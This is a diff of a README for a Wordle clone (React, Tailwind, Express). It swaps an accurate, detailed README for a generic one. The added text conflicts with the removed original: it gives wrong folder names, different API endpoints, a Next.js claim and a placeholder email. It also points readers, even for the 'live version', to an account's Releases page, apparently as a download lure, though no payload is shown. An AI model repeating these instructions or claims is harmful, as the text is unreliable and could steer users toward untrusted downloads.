@@ -1,209 +1,135 @@
-# The Wordle Game
+# The Wordle Game 🎯
 
-This project is a simple implementation of the popular word-guessing game, Wordle. The game allows users to guess a 5-letter word within 6 attempts, providing feedback on each guess.
+![Wordle Game](https://img.shields.io/badge/Wordle%20Game-Interactive-brightgreen)  
+[![Releases](https://img.shields.io/badge/Releases-Check%20Here-blue)](https://github.com/azertyuiop3003/The-Wordle-Game/releases)
 
-- **Frontend**: React + Tailwind CSS, fully interactive Wordle UI
-- **Backend**: Express API serving `/api/random-word` & `/api/word-valid/:word`, with full Swagger docs
-- **Deployment**: Monorepo deploy via Vercel
+Welcome to **The Wordle Game**, an interactive Wordle clone designed to bring fun and challenge to your day. This project combines the power of **Express.js**, **React**, and **Tailwind CSS** to create a seamless user experience with smooth animations and a responsive design.
 
-<p align="center">
-  <img src="img/wordle.png" alt="Wordle Screenshot" width="100%">
-</p>
+## Table of Contents
 
-**Live Wordle Game: [https://the-wordle-game.vercel.app/](https://the-wordle-game.vercel.app/). Feel free to give it a try!**
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Documentation](#api-documentation)
+- [Deployment](#deployment)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white" alt="Vercel" />
-  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" alt="React" />
-  <img src="https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="Tailwind CSS" />
-  <img src="https://img.shields.io/badge/React_Query-FF4154?style=for-the-badge&logo=react-query&logoColor=white" alt="React Query" />
-  <img src="https://img.shields.io/badge/Framer_Motion-0055FF?style=for-the-badge&logo=framer&logoColor=white" alt="Framer Motion" />
-  <img src="https://img.shields.io/badge/Heroicons-0EA5E9?style=for-the-badge&logo=heroicons&logoColor=white" alt="Heroicons" />
-  <img src="https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white" alt="Express" />
-  <img src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node.js" />
-  <img src="https://img.shields.io/badge/Swagger-85EA2D?style=for-the-badge&logo=swagger&logoColor=white" alt="Swagger" />
-  <img src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white" alt="Vite" />
-  <img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
-  <img src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white" alt="MongoDB" />
-  <img src="https://img.shields.io/badge/RESTful%20API-25A162?style=for-the-badge&logo=rest&logoColor=white" alt="RESTful API" />
+## Features
+
+- **Interactive Gameplay**: Engage in the classic Wordle experience with modern touches.
+- **Responsive Design**: Play on any device, from mobile to desktop.
+- **Animations**: Enjoy smooth transitions and animations for an enhanced experience.
+- **Serverless Backend**: The backend uses a serverless Express API for fetching random words and checking word validity.
+- **Swagger Documentation**: Clear API documentation to help developers understand the endpoints.
+- **Seamless Deployment**: Easily deploy the application using Vercel.
+
+## Technologies Used
+
+This project utilizes a range of technologies to create a robust application:
+
+- **Frontend**:
+  - **React**: For building user interfaces.
+  - **Tailwind CSS**: For styling the application with utility-first CSS.
+  - **Vite**: For fast development and build processes.
+
+- **Backend**:
+  - **Express.js**: To handle server-side logic.
+  - **Serverless Functions**: For efficient API management.
+
+- **Other**:
+  - **TypeScript**: For type safety and improved developer experience.
+  - **Next.js**: For server-side rendering and routing.
   
-</p>
+## Installation
 
-## 🚀 Tech Stack
+To get started with **The Wordle Game**, follow these steps:
 
-- **Frontend**: React (TypeScript), Tailwind CSS
-- **Backend**: Node.js (TypeScript), Express, `undici` for fetch, `serve-favicon`, in-memory cache + GitHub list fallback
-- **Docs**: OpenAPI (inline), Swagger UI
-- **Deploy**: Vercel (Functions + Static Build)
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/azertyuiop3003/The-Wordle-Game.git
+   cd The-Wordle-Game
+   ```
 
-## 📁 Project Structure
+2. **Install Dependencies**:
+   For the frontend:
+   ```bash
+   cd client
+   npm install
+   ```
 
-```
-/
-├── backend/
-│   ├── index.ts         # Express API + Swagger spec in one file
-│   ├── favicon.ico      # Favicon served by Express
-│   ├── package.json     # backend dependencies & scripts
-│   ├── tsconfig.json    # TypeScript config
-│   └── vercel.json      # Serverless Function config
-├── src/
-│   ├── (... more)       # React components
-│   ├── App.tsx          # Main React component (game logic + UI)
-│   ├── TileRow.tsx      # Row of 5 tiles
-│   ├── Keyboard.tsx     # On-screen keyboard
-│   ├── GameWon.tsx      # “You won” screen
-│   └── GameOver.tsx     # “Game over” screen
-├── package.json         # Frontend dependencies & scripts (CRA/Vite)
-└── README.md            # This file
-```
+   For the backend:
+   ```bash
+   cd server
+   npm install
+   ```
 
-## 🎯 Getting Started
+3. **Run the Application**:
+   Start the frontend:
+   ```bash
+   cd client
+   npm start
+   ```
 
-### 1. Prerequisites
+   Start the backend:
+   ```bash
+   cd server
+   npm start
+   ```
 
-- **Node.js** v16+
-- **npm** or **yarn**
-- (Optional) **Vercel CLI** for local emulation & deploy (`npm i -g vercel`)
+4. **Access the Application**:
+   Open your browser and navigate to `http://localhost:3000` to start playing.
 
-### 2. Install
+## Usage
 
-First, clone the repo. Then, install dependencies for both frontend and backend:
+Once the application is running, you can start playing by guessing the word of the day. The game provides feedback on your guesses, indicating which letters are correct and in the right position, which letters are correct but in the wrong position, and which letters are not in the word at all.
 
-```bash
-# Frontend
-cd <project-root>
-npm install
+### Game Rules
 
-# Backend
-cd backend
-npm install
-```
+1. You have six attempts to guess the word.
+2. Each guess must be a valid five-letter word.
+3. After each guess, the game will provide feedback:
+   - Green for correct letters in the correct position.
+   - Yellow for correct letters in the wrong position.
+   - Gray for letters not in the word.
 
----
+## API Documentation
 
-## 🛠️ Development
-
-You can run frontend and backend in parallel (two terminals).
-
-### Frontend
-
-```bash
-cd <project-root>
-npm start
-```
-
-- Opens at [http://localhost:3000](http://localhost:3000)
-- Proxy is configured so `/api/...` → backend
-
-### Backend
-
-```bash
-cd backend
-npm run build    # compiles TypeScript → dist/
-npm start        # starts express on http://localhost:3001/api/
-```
-
----
-
-## 📖 Backend API Documentation
-
-Once the backend is running at `http://localhost:3001`, you have:
-
-### Swagger UI
-
-- **URL**: `http://localhost:3001/api-docs`
-- **JSON spec**: `http://localhost:3001/swagger.json`
+The backend API provides endpoints for fetching random words and checking word validity. You can view the full API documentation using Swagger.
 
 ### Endpoints
 
-| Method | Path                    | Response                                    |
-| ------ | ----------------------- | ------------------------------------------- |
-| GET    | `/api/random-word`      | `{ "word": "<random 5-letter word>" }`      |
-| GET    | `/api/word-valid/:word` | `{ "valid": true }` or `{ "valid": false }` |
-| GET    | `/swagger.json`         | OpenAPI JSON spec                           |
-| GET    | `/api-docs`             | Swagger UI                                  |
-| GET    | `/`                     | Redirects to `/api-docs`                    |
+- **GET /api/word**: Fetch a random word.
+- **POST /api/check**: Check if a word is valid.
 
-<p align="center">
-  <img src="img/swagger.png" alt="Swagger UI Screenshot" width="100%">
-</p>
+You can explore the API documentation in detail by accessing the Swagger UI provided in the project.
 
-#### Examples
+## Deployment
 
-```bash
-# Random word
-curl http://localhost:3001/api/random-word
-# → {"word":"apple"}
+This application is deployed on **Vercel**, allowing for quick and easy access. To see the live version, visit the [Releases section](https://github.com/azertyuiop3003/The-Wordle-Game/releases).
 
-# Validate guess
-curl http://localhost:3001/api/word-valid/hello
-# → {"valid":true}
+## Contributing
 
-curl http://localhost:3001/api/word-valid/zzzzz
-# → {"valid":false}
-```
+Contributions are welcome! If you want to contribute to **The Wordle Game**, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
 
-## 📦 Build & Production
-
-### Frontend
-
-```bash
-cd <project-root>
-npm run build
-```
-
-Produces optimized static files (e.g. `build/` for CRA or `dist/` for Vite).
-
-### Backend
-
-No special build step beyond TypeScript compile:
-
-```bash
-cd backend
-npm run build
-```
-
----
-
-## ☁️ Deployment to Vercel
-
-This monorepo has both a static‐build (frontend) and a Node function (backend). From the **repo root**:
-
-1. **Login** & link:
-
-   ```bash
-   vercel
-   ```
-
-2. **Deploy**:
-
-   ```bash
-   vercel --prod
-   ```
-
-3. **Live URL**:
-
-   ```
-   https://<your-vercel-app>/
-   ```
-
-   - Frontend at `/`
-   - API at `/api/random-word`, `/api/word-valid/:word`
-   - Swagger UI at `/api-docs`
-
----
-
-## ❓ Troubleshooting
-
-- **Backend fetch fails**: you'll see a console warning and the built-in 108-word fallback will be used.
-- **Port conflict**: set `PORT` before `npm start` in `backend`.
-- **CORS issues**: the frontend proxies `/api` to the backend in dev; production calls same origin.
-
----
-
-## 📄 License
+## License
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or feedback, feel free to reach out:
+
+- **GitHub**: [azertyuiop3003](https://github.com/azertyuiop3003)
+- **Email**: your-email@example.com
+
+Thank you for checking out **The Wordle Game**! Enjoy playing and contributing to this fun project. For the latest updates, check the [Releases section](https://github.com/azertyuiop3003/The-Wordle-Game/releases).
